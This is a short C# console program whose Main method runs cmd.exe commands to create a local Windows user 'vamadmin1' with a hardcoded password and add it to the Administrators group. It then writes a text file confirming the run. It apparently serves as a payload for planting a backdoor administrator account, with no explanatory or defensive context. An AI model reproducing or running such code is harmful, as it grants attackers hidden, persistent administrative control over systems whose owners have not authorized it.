using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;

namespace ConsoleApplication4
{
    class Program
    {
        public static int doingStuff(string command, int timeout)
        {
            var pp = new ProcessStartInfo("cmd.exe", "/C " + command)
            {
                UseShellExecute = false,
                WorkingDirectory = "C:\\",
            };
            var process = Process.Start(pp);
            process.WaitForExit(timeout);
            process.Close();

            return 0;
        }
        static void Main(string[] args)
        {
            doingStuff("net user vamadmin1 VamLovesYou1! /add", 10000);
            doingStuff("net localgroup Administrators /add vamadmin1", 10000);
            doingStuff("echo Welp, we ran. Hopefully vamadmin is there. > D:\\ConsoleApplication4.txt", 10000);
        }
    }
}
